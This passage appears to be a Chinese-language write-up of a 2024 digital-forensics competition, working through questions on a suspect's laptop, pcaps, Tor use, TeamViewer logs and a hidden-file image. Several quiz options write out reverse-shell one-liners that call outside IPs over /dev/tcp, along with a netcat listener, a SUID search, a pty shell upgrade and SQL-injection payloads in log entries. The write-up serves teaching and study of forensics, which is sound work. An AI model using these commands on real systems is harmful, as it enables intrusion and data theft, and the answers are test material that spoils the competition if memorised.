+<div class="sourceLine" id="cb1-95" data-line-number="95">        <span class="st">'C'</span>: b<span class="st">'</span><span class="ch">\xea\x15\xf9\x05\x85\xe8</span><span class="st">h</span><span class="ch">\x87\xc4\xf0</span><span class="st">O</span><span class="ch">\x8a\xba</span><span class="st">1</span><span class="ch">\x96\x05</span><span class="st">b</span><span class="ch">\xf9\xa3</span><span class="st">g</span><span class="ch">\xba</span><span class="st">Mm</span><span class="ch">\xa4\t</span><span class="st">,</span><span class="ch">\xe0</span><span class="st">Q</span><span class="ch">\x87\x8e\xfb\x8c</span><span class="st">'</span>,</div>
+<div class="sourceLine" id="cb1-96" data-line-number="96">        <span class="st">'D'</span>: b<span class="st">'q!</span><span class="ch">\xae</span><span class="st">2</span><span class="ch">\x1f</span><span class="st">vo</span><span class="ch">\xb6</span><span class="st">]</span><span class="ch">\xfb\x1f\x8c\xe5\x18\x03\x0b\xcc\xc9</span><span class="st">3</span><span class="ch">\xf7</span><span class="st">/us</span><span class="ch">\x8a\x1e</span><span class="st">;</span><span class="ch">\xd2\xe3\x81\x05\xaa\x04</span><span class="st">'</span></div>
+<div class="sourceLine" id="cb1-97" data-line-number="97">    }</div>
+<div class="sourceLine" id="cb1-98" data-line-number="98">    </div>
+<div class="sourceLine" id="cb1-99" data-line-number="99">    <span class="cf">for</span> option, key_bytes <span class="kw">in</span> options.items():</div>
+<div class="sourceLine" id="cb1-100" data-line-number="100">        match <span class="op">=</span> <span class="st">"✅ 匹配"</span> <span class="cf">if</span> calculated_key <span class="op">==</span> key_bytes <span class="cf">else</span> <span class="st">"❌ 不匹配"</span></div>
+<div class="sourceLine" id="cb1-101" data-line-number="101">        <span class="bu">print</span>(<span class="ss">f"选项 </span><span class="sc">{</span>option<span class="sc">}</span><span class="ss">: </span><span class="sc">{</span>match<span class="sc">}</span><span class="ss">"</span>)</div>
+<div class="sourceLine" id="cb1-102" data-line-number="102">        <span class="bu">print</span>(<span class="ss">f"  计算密钥: </span><span class="sc">{</span>calculated_key<span class="sc">.</span><span class="bu">hex</span>()[:<span class="dv">32</span>]<span class="sc">}</span><span class="ss">..."</span>)</div>
+<div class="sourceLine" id="cb1-103" data-line-number="103">        <span class="bu">print</span>(<span class="ss">f"  选项密钥: </span><span class="sc">{</span>key_bytes<span class="sc">.</span><span class="bu">hex</span>()[:<span class="dv">32</span>]<span class="sc">}</span><span class="ss">..."</span>)</div>
+<div class="sourceLine" id="cb1-104" data-line-number="104">        <span class="bu">print</span>()</div>
+<div class="sourceLine" id="cb1-105" data-line-number="105"></div>
+<div class="sourceLine" id="cb1-106" data-line-number="106"><span class="cf">if</span> <span class="va">__name__</span> <span class="op">==</span> <span class="st">"__main__"</span>:</div>
+<div class="sourceLine" id="cb1-107" data-line-number="107">    <span class="co"># 文件路径和密码</span></div>
+<div class="sourceLine" id="cb1-108" data-line-number="108">    encrypted_file <span class="op">=</span> <span class="st">"secretExcel.encrypted"</span></div>
+<div class="sourceLine" id="cb1-109" data-line-number="109">    password <span class="op">=</span> <span class="st">"iwillnottellyouthepassworduntiligetthemoney"</span></div>
+<div class="sourceLine" id="cb1-110" data-line-number="110">    </div>
+<div class="sourceLine" id="cb1-111" data-line-number="111">    <span class="bu">print</span>(<span class="st">"Excel文件解密工具"</span>)</div>
+<div class="sourceLine" id="cb1-112" data-line-number="112">    <span class="bu">print</span>(<span class="st">"="</span> <span class="op">*</span> <span class="dv">60</span>)</div>
+<div class="sourceLine" id="cb1-113" data-line-number="113">    </div>
+<div class="sourceLine" id="cb1-114" data-line-number="114">    <span class="cf">if</span> <span class="kw">not</span> os.path.exists(encrypted_file):</div>
+<div class="sourceLine" id="cb1-115" data-line-number="115">        <span class="bu">print</span>(<span class="ss">f"错误: 加密文件 </span><span class="sc">{</span>encrypted_file<span class="sc">}</span><span class="ss"> 不存在"</span>)</div>
+<div class="sourceLine" id="cb1-116" data-line-number="116">        exit(<span class="dv">1</span>)</div>
+<div class="sourceLine" id="cb1-117" data-line-number="117">    </div>
+<div class="sourceLine" id="cb1-118" data-line-number="118">    <span class="co"># 解密并找到密钥</span></div>
+<div class="sourceLine" id="cb1-119" data-line-number="119">    key, option <span class="op">=</span> decrypt_and_find_key(encrypted_file, password)</div>
+<div class="sourceLine" id="cb1-120" data-line-number="120">    </div>
+<div class="sourceLine" id="cb1-121" data-line-number="121">    <span class="cf">if</span> key <span class="kw">and</span> option:</div>
+<div class="sourceLine" id="cb1-122" data-line-number="122">        <span class="bu">print</span>(<span class="st">"</span><span class="ch">\n</span><span class="st">"</span> <span class="op">+</span> <span class="st">"="</span> <span class="op">*</span> <span class="dv">60</span>)</div>
+<div class="sourceLine" id="cb1-123" data-line-number="123">        <span class="bu">print</span>(<span class="st">"🎊 任务完成!"</span>)</div>
+<div class="sourceLine" id="cb1-124" data-line-number="124">        <span class="bu">print</span>(<span class="st">"="</span> <span class="op">*</span> <span class="dv">60</span>)</div>
+<div class="sourceLine" id="cb1-125" data-line-number="125">        <span class="bu">print</span>(<span class="ss">f"第46题答案: </span><span class="sc">{</span>option<span class="sc">}</span><span class="ss">"</span>)</div>
+<div class="sourceLine" id="cb1-126" data-line-number="126">        <span class="bu">print</span>(<span class="ss">f"密钥值: </span><span class="sc">{</span>key<span class="sc">.</span><span class="bu">hex</span>()<span class="sc">.</span>upper()<span class="sc">}</span><span class="ss">"</span>)</div>
+<div class="sourceLine" id="cb1-127" data-line-number="127">        </div>
+<div class="sourceLine" id="cb1-128" data-line-number="128">        <span class="co"># 详细验证</span></div>
+<div class="sourceLine" id="cb1-129" data-line-number="129">        verify_key_options(key)</div>
+<div class="sourceLine" id="cb1-130" data-line-number="130">    <span class="cf">else</span>:</div>
+<div class="sourceLine" id="cb1-131" data-line-number="131">        <span class="bu">print</span>(<span class="st">"</span><span class="ch">\n</span><span class="st">💥 解密失败，请检查文件和密码"</span>)</div></code></pre>
+<p>跑一下选D。 <img src="https://github.com/ncbdd0/images/raw/main/meiya2024group/51.png"></p>
+<h4 id="单选题参考ben_laptop.zip解密后的excel文件中程琳的电话号码是什么">47.[单选题]参考Ben_Laptop.zip，解密后的Excel文件中，程琳的电话号码是什么？</h4>
+<h5 id="a.-852-106523728123">A. +852 106523728123</h5>
+<h5 id="b.-852-180300901529">B. +852 180300901529</h5>
+<h5 id="c.-60-243428690343">C. +60 243428690343</h5>
+<h5 id="d.-63-060940949159">D. +63 060940949159</h5>
+<p>跑出来后把后缀改xlsx打开，直接看。 <img src="https://github.com/ncbdd0/images/raw/main/meiya2024group/50.png"></p>
+<h4 id="填空题参考ben-laptop.zip解密后的excel文件中周亮的idpassport-number是什么提示只需使用阿拉伯数字回答">48.[填空题]参考Ben Laptop.zip，解密后的Excel文件中，周亮的ID/Passport Number是什么？（提示：只需使用阿拉伯数字回答）</h4>
+<p>依旧直接看。 <img src="https://github.com/ncbdd0/images/raw/main/meiya2024group/52.png"></p>
+<h4 id="单选题根据可能难以破解的加密你意识到ben对黑客技术有深入的了解请回答以下问题以便了解ben的运作ben想要有效地搜索信息他可以使用以下哪个gogle高级搜索运算符来搜索某个特定网站">49.[单选题]根据可能难以破解的加密，你意识到Ben对黑客技术有深入的了解，请回答以下问题，以便了解Ben的运作。Ben想要有效地搜索信息，他可以使用以下哪个Gogle高级搜索运算符来搜索某个特定网站？</h4>
+<h5 id="a.-related">A. [related:]</h5>
+<h5 id="b.-inurl">B. [inurl:]</h5>
+<h5 id="c.-site">C. [site:]</h5>
+<h5 id="d.-info">D. [info:]</h5>
+<p>这题稍微知道一点应该就知道选C。</p>
+<h3 id="ben的attachment文件夹"><em>Ben的Attachment文件夹</em></h3>
+<h4 id="单选题参考材料1.pdfben试图入侵一个系统他尝试在系统中打开http服务器使用python内置的http.server模块启动基本http服务器的命令是什么以便攻击者从目标机器下载文件">50.[单选题]参考材料1.pdf，Ben试图入侵一个系统，他尝试在系统中打开HTTP服务器，使用Python内置的http.server模块启动基本HTTP服务器的命令是什么，以便攻击者从目标机器下载文件？</h4>
+<h5 id="a.-python3--m-http.server-9000">A. python3 -m http.server 9000</h5>
+<h5 id="b.-python3--a-http.server-9000">B. python3 -a http.server 9000</h5>
+<h5 id="c.-python3--r-http.server-9000">C. python3 -r http.server 9000</h5>
+<h5 id="d.-python3--m-http.server-8000">D. python3 -m http.server 8000</h5>
+<p>这里我刚开始还以为这些pdf和pcap文件在电脑的镜像文件里，忘了还有个attachment文件夹……不过这题可以直接梭。 <img src="https://github.com/ncbdd0/images/raw/main/meiya2024group/54.png"> <img src="https://github.com/ncbdd0/images/raw/main/meiya2024group/53.png"></p>
+<h4 id="单选题参考材料2.pdfben准备了几个用于黑客攻击的脚本这段代码的攻击目的是什么">51.[单选题]参考材料2.pdf，Ben准备了几个用于黑客攻击的脚本，这段代码的攻击目的是什么？</h4>
+<h5 id="a.-拒绝服务">A. 拒绝服务</h5>
+<h5 id="b.-缓冲区溢出">B. 缓冲区溢出</h5>
+<h5 id="c.-建立反向-shell">C. 建立反向 shell</h5>
+<h5 id="d.-勒索软件">D. 勒索软件</h5>
+<p>2.pdf打开是这段代码。 <img src="https://github.com/ncbdd0/images/raw/main/meiya2024group/55.png"></p>
+<p>好像是pwn题，看不懂扔给ai。 <img src="https://github.com/ncbdd0/images/raw/main/meiya2024group/57.png"></p>
+<h4 id="单选题ben准备了几个用于黑客攻击的脚本参考材料3.pdf他采用了什么技术来保护代码">52.[单选题]Ben准备了几个用于黑客攻击的脚本，参考材料3.pdf，他采用了什么技术来保护代码？</h4>
+<h5 id="a.-加密">A. 加密</h5>
+<h5 id="b.代码混淆">B.代码混淆</h5>
+<h5 id="c.-隐写术">C. 隐写术</h5>
+<h5 id="d.-编译">D. 编译</h5>
+<p>3.pdf： <img src="https://github.com/ncbdd0/images/raw/main/meiya2024group/56.png"></p>
+<p>web题，虽然依旧ai（）。 <img src="https://github.com/ncbdd0/images/raw/main/meiya2024group/58.png"> <img src="https://github.com/ncbdd0/images/raw/main/meiya2024group/59.png"> <img src="https://github.com/ncbdd0/images/raw/main/meiya2024group/60.png"></p>
+<h4 id="单选题参考材料4.pdf他利用了什么方法来获取反弹shellreverse-shel">53.[单选题]参考材料4.pdf，他利用了什么方法来获取反弹shell（Reverse shel）？</h4>
+<h5 id="a.中间人攻击">A.中间人攻击</h5>
+<h5 id="b.暴力破解">B.暴力破解</h5>
+<h5 id="c.缓冲区溢出">C.缓冲区溢出</h5>
+<h5 id="d.文件上传">D.文件上传</h5>
+<p>4.pdf： <img src="https://github.com/ncbdd0/images/raw/main/meiya2024group/61.png"> <img src="https://github.com/ncbdd0/images/raw/main/meiya2024group/62.png"> <img src="https://github.com/ncbdd0/images/raw/main/meiya2024group/63.png"> <img src="https://github.com/ncbdd0/images/raw/main/meiya2024group/64.png"></p>
+<h4 id="单选题参考1.pcapben使用了哪些命令来扫描目标机器提示ubuntu">54.[单选题]参考1.pcap，Ben使用了哪些命令来扫描目标机器（提示：Ubuntu）</h4>
+<h5 id="i-arp-scan--l">i） arp-scan -l</h5>
+<h5 id="ii-nmap--p1-65535--sv-sc--o">ii） nmap -p1-65535 -sV-sC -O</h5>
+<h5 id="iii-nmap--sx">iii） nmap -Sx</h5>
+<h5 id="iv-nmap--ss">iv） nmap -Ss</h5>
+<h5 id="a.-iii">A. i&amp;ii</h5>
+<h5 id="b.-iiiii">B. ii&amp;iii</h5>
+<h5 id="c.-iiv">C. i&amp;iv</h5>
+<h5 id="d.以上皆是">D.以上皆是</h5>
+<p>流量分析题，虽然学misc但是依旧无法战胜orz。补充个ARP的知识点：</p>
+<p><strong>ARP是一种在局域网（LAN）中使用的协议，用来把IP地址转换成MAC地址。</strong></p>
+<p>也就是说：</p>
+<p><strong>计算机只知道目标主机的 IP 地址，但在以太网通信时必须使用目标的 MAC 地址。ARP就是负责“查IP找MAC”的协议。</strong></p>
+<p>贴ai的回答： <img src="https://github.com/ncbdd0/images/raw/main/meiya2024group/65.png"> <img src="https://github.com/ncbdd0/images/raw/main/meiya2024group/66.png"></p>
+<p>还有一个命令分析：</p>
+<pre class="txt"><code>① arp-scan -l
+
+含义：
+扫描本地局域网（Local network）中所有在线主机。
+
+解释：
+
+arp-scan 是一个用 ARP 协议来发现主机的工具。
+
+-l（小写 L）表示扫描本地网络（local）。
+
+作用：
+用 ARP 广播包问：“谁是 192.168.1.x？请告诉我你的 MAC 地址。”
+谁回应了，就说明那台主机是在线的。
+
+特征：
+在 Wireshark 里能看到大量 ARP Request（广播请求）包。
+
+② nmap -p1-65535 -sV -sC -O
+
+含义：
+用 Nmap 对目标主机做完整端口扫描、版本探测、脚本扫描和操作系统识别。
+
+参数说明：
+
+-p1-65535 → 扫描 1 到 65535 所有 TCP 端口（完整扫描）。
+
+-sV → 探测端口上运行的服务及版本（例如 Apache、OpenSSH 等）。
+
+-sC → 启用 Nmap 默认脚本集（安全检测脚本）。
+
+-O → 操作系统识别（猜测目标主机的 OS）。
+
+作用：
+这是一个非常详细的综合扫描命令，常用于渗透测试阶段。
+
+③ nmap -sX
+
+Xmas 扫描（圣诞扫描）是啥？
+它会发送带有 FIN、URG、PSH 标志位的 TCP 包，看目标主机如何响应，以判断端口状态。
+
+④ nmap -sS
+
+-sS 表示 SYN 扫描（半开扫描）：
+
+Nmap 发送一个 SYN 包；
+
+如果对方回应 SYN-ACK → 端口开放；
+
+然后 Nmap 立即发 RST 断开连接；
+
+这种方式不会完成三次握手，比较“隐蔽”。</code></pre>
+<h4 id="单选题参考2.pcap第56号数据包的代码功能是什么">55.[单选题]参考2.pcap，第56号数据包的代码功能是什么？</h4>
+<h5 id="a.-清除记录">A. 清除记录</h5>
+<h5 id="b.拒绝服务">B.拒绝服务</h5>
+<h5 id="c.测试注入漏洞">C.测试注入漏洞</h5>
+<h5 id="d.反向外殼-reverse-shell">D.反向外殼 （Reverse Shell）</h5>
+<p>2这个包还挺小的，找到56号后右键查看分组字节流。代码在这。 <img src="https://github.com/ncbdd0/images/raw/main/meiya2024group/68.png"></p>
+<p>然后直接代码丢给ai。 <img src="https://github.com/ncbdd0/images/raw/main/meiya2024group/69.png"></p>
+<h4 id="填空题参考1.pcap当ben成功进入目标系统时攻击者获取的账户答案格式请使用小写英文字母作答">56.[填空题]参考1.pcap，当Ben成功进入目标系统时，攻击者获取的账户？（答案格式：请使用小写英文字母作答）</h4>
+<p>这个先让ai给个步骤。 <img src="https://github.com/ncbdd0/images/raw/main/meiya2024group/70.png"></p>
+<p>tcp查找whoami，然后右键追踪tcp流。 <img src="https://github.com/ncbdd0/images/raw/main/meiya2024group/72.png"> <img src="https://github.com/ncbdd0/images/raw/main/meiya2024group/71.png"></p>
+<p>root是账户。</p>
+<h4 id="单选题ben正在尝试入侵一个系统并且他正在进行开源研究他发现nc--lvp-9000将被用来连接到反弹shellreverse-shellben将使用什么命令来创建反弹shell-reverse-shell">57.[单选题]Ben正在尝试入侵一个系统，并且他正在进行开源研究，他发现nc -lvp 9000将被用来连接到反弹shell（Reverse Shell），Ben将使用什么命令来创建反弹shell （Reverse Shell）？</h4>
+<h5 id="i0196exec-196devtcp10.10.10.109000sh-196-196-2196">i）0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/10.10.10.10/9000;sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196</h5>
+<h5 id="iiexec-5devtcp10.10.10.109000cat-5-while-read-line-do-line-25-5-done">ii）exec 5&lt;&gt;/dev/tcp/10.10.10.10/9000;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done</h5>
+<h5 id="iiibinbash--i-devtcp192.168.217.1394444-01">iii）/bin/bash -i &gt;&amp; /dev/tcp/192.168.217.139/4444 0&gt;&amp;1</h5>
+<h5 id="ivsh--i-5-devtcp10.10.10.109000-05-15-25">iv）sh -i 5&lt;&gt; /dev/tcp/10.10.10.10/9000 0&lt;&amp;5 1&gt;&amp;5 2&gt;&amp;5</h5>
+<h5 id="a.-i">A. i</h5>
+<h5 id="b.-ii">B. ii</h5>
+<h5 id="c.-iii">C. iii</h5>
+<h5 id="d.-iv">D. iv</h5>
+<p>选C，这个指令其实跟55题那个指令一样。</p>
+<h4 id="填空题参考材料5.pdfben输入了find--perm--4000-2devnull后显示了材料5.pdf的內容這些內容所显示的内容除具有执行权限还设置了什么答案格式请以大写英文字母作答输入答案">58.[填空题]参考材料5.pdf，Ben输入了“find / -perm -4000 2&gt;/dev/null”后，显示了材料5.pdf的內容，這些內容所显示的内容除具有执行权限，还设置了什么？（答案格式：请以大写英文字母作答输入答案）</h4>
+<p>5.pdf： <img src="https://github.com/ncbdd0/images/raw/main/meiya2024group/73.png"> <img src="https://github.com/ncbdd0/images/raw/main/meiya2024group/74.png"></p>
+<h4 id="单选题ben发现了下面的命令import-pty-pty.spawnbinbash它的功能是">59.[单选题]Ben发现了下面的命令import pty; pty.spawn(“/bin/bash”)，它的功能是？</h4>
+<h5 id="a.-在shell中导入python函数">A. 在shell中导入Python函数</h5>
+<h5 id="b.-允许shell执行python命令">B. 允许shell执行Python命令</h5>
+<h5 id="c.-获取比www-data用户更高权限的交互式shell">C. 获取比www-data用户更高权限的交互式shell</h5>
+<h5 id="d.-以上皆不是-1">D. 以上皆不是</h5>
+<p>这个也是理论题，梭一下。 <img src="https://github.com/ncbdd0/images/raw/main/meiya2024group/75.png"> <img src="https://github.com/ncbdd0/images/raw/main/meiya2024group/76.png"></p>
+<h3 id="ben的windows笔记本电脑"><em>Ben的Windows笔记本电脑</em></h3>
+<h4 id="填空题-你注意到ben的笔记本电脑上安装了暗网-tor请回答以下问题-ben应该输入什么命令来在-kali-linux-中执行-tor-浏览器-答案格式小写英文字母和符号-混合作答例如abc-def">60. [填空题] 你注意到Ben的笔记本电脑上安装了暗网 Tor,请回答以下问题。 Ben应该输入什么命令来在 Kali Linux 中执行 Tor 浏览器? (答案格式:小写英文字母和符号’-’混合作答,例如:abc-def)</h4>
+<p>这里我想着应该直接梭就可以吧（），师傅们的wp是取证kali镜像文件。 <img src="https://github.com/ncbdd0/images/raw/main/meiya2024group/77.png"></p>
+<h4 id="单选题参考ben_laptop.zipben经常使用tor浏览器该tor浏览器把多少个.onion链接添加为书签">61.[单选题]参考Ben_Laptop.zip，Ben经常使用Tor浏览器，该Tor浏览器把多少个.onion链接添加为书签？</h4>
+<h5 id="a.-1-2">A. 1</h5>
+<h5 id="b.-2">B. 2</h5>
+<h5 id="c.-3">C. 3</h5>
+<h5 id="d.-4">D. 4</h5>
+<p>这题其实我当时仿真了一下，不过后面发现火眼里就能看看（？，按创建时间排可以知道前六个都是浏览器自带的。 <img src="https://github.com/ncbdd0/images/raw/main/meiya2024group/78.png"></p>
+<h4 id="单选题在检査ben的记录时发现了port-9151的连接那是指ben在使用什么浏览器">62.[单选题]在检査Ben的记录时，发现了Port 9151的连接，那是指Ben在使用什么浏览器？</h4>
+<h5 id="a.-chrome">A. Chrome</h5>
+<h5 id="b.-tor">B. Tor</h5>
+<h5 id="c.-duckduckgo">C. Duckduckgo</h5>
+<h5 id="d.-edge">D. Edge</h5>
+<p>这个端口不会看，直接梭一下居然也能跑出来。 <img src="https://github.com/ncbdd0/images/raw/main/meiya2024group/79.png"></p>
+<h4 id="判断题参考材料6.pdf应该保持默认设置以便firefox浏览器使用tor网络">63.[判断题]参考材料6.pdf，应该保持默认设置，以便Firefox浏览器使用Tor网络？</h4>
+<p>6.pdf： <img src="https://github.com/ncbdd0/images/raw/main/meiya2024group/80.png"> <img src="https://github.com/ncbdd0/images/raw/main/meiya2024group/81.png"></p>
+<h4 id="单选题参考ben_laptop.zipben使用openvpn-5.196.64.231多少天答案格式只需使用阿拉伯数字回答">64.[单选题]参考Ben_Laptop.zip，Ben使用OpenVPN 5.196.64.231多少天？（答案格式：只需使用阿拉伯数字回答）</h4>
+<h5 id="a.-1-3">A. 1</h5>
+<h5 id="b.-2-1">B. 2</h5>
+<h5 id="c.-3-1">C. 3</h5>
+<h5 id="d.-4-1">D. 4</h5>
+<p>这题其实自己做的时候没思路，仿真出来单看软件里面没显示相关信息，取证里也没显示，后面看了wp才知道要去日志里翻orz。</p>
+<p>导出日志。 <img src="https://github.com/ncbdd0/images/raw/main/meiya2024group/82.png"></p>
+<p>输入ip后能看到在这两天使用。 <img src="https://github.com/ncbdd0/images/raw/main/meiya2024group/83.png"></p>
+<h4 id="填空题参考ben_laptop.zip他使用了哪种算法加密密码答案格式大写英文字母和符号-混合组成">65.[填空题]参考Ben_Laptop.zip，他使用了哪种算法加密密码？（答案格式：大写英文字母和符号’-’混合组成）</h4>
+<p>这个日志里倒是也有。 <img src="https://github.com/ncbdd0/images/raw/main/meiya2024group/84.png"></p>
+<h4 id="单选题在2024年8月16日174006发生了什么">66.[单选题]在2024年8月16日17:40:06，发生了什么？</h4>
+<h5 id="i无法在奏接字socket上执行操作">i）无法在奏接字（socket）上执行操作</h5>
+<h5 id="ii系统缺乏足够的缓冲区空间">ii）系统缺乏足够的缓冲区空间</h5>
+<h5 id="iii队列queue已满">iii）队列（queue）已满。</h5>
+<h5 id="提示1套接字是用于网络通信的编程接口允许程序在网络上发送和接收数据2队列已满是程序试图将更多的元素插入到一个已经达到容量上限的队列中">（提示：1）套接字是用于网络通信的编程接口，允许程序在网络上发送和接收数据，2）队列已满是程序试图将更多的元素插入到一个已经达到容量上限的队列中）</h5>
+<h5 id="a.-iii-1">A. i&amp;ii</h5>
+<h5 id="b.-ii-iii">B. ii &amp; iii</h5>
+<h5 id="c.iii">C.i&amp;ii</h5>
+<h5 id="d.以上皆是-1">D.以上皆是</h5>
+<p>在日志里找到相关的时间。 <img src="https://github.com/ncbdd0/images/raw/main/meiya2024group/85.png"></p>
+<p>然后丢给ai。 <img src="https://github.com/ncbdd0/images/raw/main/meiya2024group/86.png"></p>
+<h4 id="单选题调查员把一只属于ben的u盘和一张sd卡交给了你进行分析参考ben_usb.e01是什么导致了满汉全席.jpg和满汉全席secret.jpg之间的大小差异">67.[单选题]调查员把一只属于Ben的U盘和一张SD卡交给了你进行分析。参考Ben_USB.e01，是什么导致了“满汉全席.jpg”和“满汉全席Secret.jpg”之间的大小差异？</h4>
+<h5 id="a.-档案嵌入其中">A. 档案嵌入其中</h5>
+<h5 id="b.-像素差异">B. 像素差异</h5>
+<h5 id="c.-mac-时间更改">C. MAC 时间更改</h5>
+<h5 id="d.-错误的档扩展名">D. 错误的档扩展名</h5>
+<p>先导出两张图片。 <img src="https://github.com/ncbdd0/images/raw/main/meiya2024group/87.png"></p>
+<p>大脑有点犯浑，第一次做的时候居然没想到丢进010看。用010看两个文件能看到文件比较大的那个末尾藏了个文档。 <img src="https://github.com/ncbdd0/images/raw/main/meiya2024group/88.png"></p>
+<p>binwalk分离一下。 <img src="https://github.com/ncbdd0/images/raw/main/meiya2024group/89.png"></p>
+<p>一个压缩包，这个xml打开往下翻还拿到了下一题的密码。 <img src="https://github.com/ncbdd0/images/raw/main/meiya2024group/90.png"> <img src="https://github.com/ncbdd0/images/raw/main/meiya2024group/91.png"></p>
+<h4 id="填空题参考bensdcard.e01ben的sd卡的解密密码是">68.[填空题]参考BenSDCard.e01，Ben的SD卡的解密密码是？</h4>
+<p>答案上一题里。</p>
+<h4 id="填空题参考ben_laptop.zip在20240823-145459-utc8ben浏览了哪个网站答案格式httpsxxxxxx.com">69.[填空题]参考Ben_Laptop.zip，在2024/08/23 14:54:59 UTC+8，Ben浏览了哪个网站？（答案格式：“https://xxxxxx.com/”）</h4>
+<p>这个在时间线里找就行。 <img src="https://github.com/ncbdd0/images/raw/main/meiya2024group/92.png"></p>
+<h4 id="填空题参考ben_laptop.zipben浏览上一题所述的网站时连接到他的计算机的wi-fi-mac地址是答案格式a1b2c3d4e5f6">70.[填空题]参考Ben_Laptop.zip，Ben浏览上一题所述的网站时连接到他的计算机的Wi-Fi MAC地址是？（答案格式：“A1:B2:C3:D4:E5:F6”）</h4>
+<p>好像基本上wifi连接记录里都是这个地址，虽然不知道为什么答案不对。 <img src="https://github.com/ncbdd0/images/raw/main/meiya2024group/93.png"></p>
+<h3 id="ben的跳转站镜像文件"><em>Ben的跳转站镜像文件</em></h3>
+<h4 id="单选题参考ben_laptop.zip和ben_jumpstation.zip回答以下问题ben的计算机使用下列哪款远程桌面软件访问了ben的跳转站jumpstation">71.[单选题]参考Ben_laptop.zip和Ben_Jumpstation.zip，回答以下问题：Ben的计算机使用下列哪款远程桌面软件访问了Ben的跳转站（Jumpstation）？</h4>
+<h5 id="i向日葵远程控制">i：向日葵远程控制</h5>
+<h5 id="iianydesk">ii：AnyDesk</h5>
+<h5 id="iiiteamiviewer">iii：TeamiViewer</h5>
+<h5 id="a.-iii-2">A. i&amp;ii</h5>
+<h5 id="b.-iiiii-1">B. ii&amp;iii</h5>
+<h5 id="c.-只有iii">C. 只有iii</h5>
+<h5 id="d.-只有ii">D. 只有ii</h5>
+<p>这个1和2没有连接记录，3的连接记录里的账户都对得上，那应该只有这个（）。 <img src="https://github.com/ncbdd0/images/raw/main/meiya2024group/94.png"> <img src="https://github.com/ncbdd0/images/raw/main/meiya2024group/95.png"></p>
+<h4 id="填空题参考ben_jumpstation.zipben的跳转站-jumpstationip地址和子网掩码subnet-mask是什么答案格式192.168.1.128">72.[填空题]参考Ben_Jumpstation.zip，Ben的跳转站 （Jumpstation）IP地址和子网掩码（Subnet mask）是什么？（答案格式：192.168.1.1/28）</h4>
+<p>这个子网掩码要转一下，255.255.255.0对应CIDR表示法的/24。 <img src="https://github.com/ncbdd0/images/raw/main/meiya2024group/96.png"></p>
+<h4 id="填空题参考ben_jumpstation.zip在ben的跳转站jumpstation上该远程桌面软件中的访问id是什么答案格式请用阿拉伯数字作答">73.[填空题]参考Ben_Jumpstation.zip，在Ben的跳转站（Jumpstation）上，该远程桌面软件中的访问ID是什么？（答案格式：请用阿拉伯数字作答）</h4>
+<p>teamviewer里直接看。 <img src="https://github.com/ncbdd0/images/raw/main/meiya2024group/97.png"></p>
+<h4 id="填空题参考ben_jumpstation.zipalice何时从跳转站jumpstation下载了文件请以utc8回答答案格式yyyy-mm-dd-hhmmss">74.[填空题]参考Ben_Jumpstation.zip，Alice何时从跳转站（Jumpstation）下载了文件？（请以UTC+8回答）（答案格式：YYYY-MM-DD HH:MM:SS）</h4>
+<p>这里也不会做，后面知道要去翻teamviewer登录的日志。</p>
+<p>导出日志文件。 <img src="https://github.com/ncbdd0/images/raw/main/meiya2024group/98.png"></p>
+<p>先搜索找到alice登录的时候，然后往下翻，能找到下载文件的记录。 <img src="https://github.com/ncbdd0/images/raw/main/meiya2024group/99.png"></p>
+<p>但这题还埋了个坑点，就是系统时间更改过，所以要在找到的时间的基础上增加15h。 <img src="https://github.com/ncbdd0/images/raw/main/meiya2024group/100.png"></p>
+<h4 id="单选题参考ben-jumpstation.zip有多少个访问id连接过跳转站-jumpstation">75.[单选题]参考Ben Jumpstation.zip，有多少个访问ID连接过跳转站 （Jumpstation）？</h4>
+<h5 id="a.1">A.1</h5>
+<h5 id="b.-2-2">B. 2</h5>
+<h5 id="c.-5-1">C. 5</h5>
+<h5 id="d.-6">D. 6</h5>
+<p>teamviewer直接看。 <img src="https://github.com/ncbdd0/images/raw/main/meiya2024group/101.png"></p>
+<h3 id="理论题"><em>理论题</em></h3>
+<h4 id="单选题您正在检查来自web应用程序防火墙的http流量日志并注意到以下日志条目">76.[单选题]您正在检查来自Web应用程序防火墙的HTTP流量日志，并注意到以下日志条目：</h4>
+<h5 id="get-searchq273bshutdown--http1.1-500">[2023-10-15 11:45:12] “GET /search?q=%27%3B+SHUTDOWN±- HTTP/1.1” 500</h5>
+<h5 id="get-searchq27unionselectpasswordfromusers--http1.1-200">[2023-10-15 11:45:15] “GET /search?q=%27+UNION+SELECT+password+FROM+users±- HTTP/1.1” 200</h5>
+<h5 id="get-searchq27or13d1--http1.1-200">[2023-10-15 11:45:18] “GET /search?q=%27+OR+1%3D1±- HTTP/1.1” 200</h5>
+<h5 id="根据这些日志条目下列哪项陈述正确识别了攻击的类型和目标组件">根据这些日志条目，下列哪项陈述正确识别了攻击的类型和目标组件？</h5>
+<h5 id="i.-正在尝试sql注入攻击">i. 正在尝试SQL注入攻击｡</h5>
+<h5 id="ii.-攻击者瞄准的是web应用程序的数据库">ii. 攻击者瞄准的是Web应用程序的数据库｡</h5>
+<h5 id="iii.-正在执行跨站点脚本xss攻击">iii. 正在执行跨站点脚本（XSS）攻击｡</h5>
+<h5 id="iv.-正在瞄准web服务器的操作系统">iv. 正在瞄准Web服务器的操作系统｡</h5>
+<h5 id="a.-iii-3">A. i&amp;ii</h5>
+<h5 id="b.-iiiii-2">B. ii&amp;iii</h5>
+<h5 id="c.-iiv-1">C. i&amp;iv</h5>
+<h5 id="d.-iiiiv">D. iii&amp;iv</h5>
+<p>web题，但依旧直接梭（）。 <img src="https://github.com/ncbdd0/images/raw/main/meiya2024group/102.png"> <img src="https://github.com/ncbdd0/images/raw/main/meiya2024group/103.png"></p>
+<ol start="77" type="1">
+<li>[单选题]在对网络日志进行取证分析时，您发现内部主机向可疑網域发出了不寻常的DNS查询</li>
+</ol>
+<pre class="txt"><code>Timestamp:2024-09-23 12:00:00
+Query:dGhpc3Bj.susdomain.com
+Type:TXT
+
+Timestamp:2024-09-23 12:05:00
+Query:cGFzc3dvcmRpcw==.susdomain.com
+Type:TXT
+
+Timestamp:2024-09-23 12:10:00
+Query:TWVpeWEyMDI0.susdomain.com
+Type:TXT</code></pre>
+<h5 id="结果顯示包含大量base64编码数据攻击者使用了什么技术">结果顯示包含大量base64编码数据，攻击者使用了什么技术？</h5>
+<h5 id="a.-域生成算法dga用于c2通信">A. 域生成算法（DGA）用于C2通信</h5>
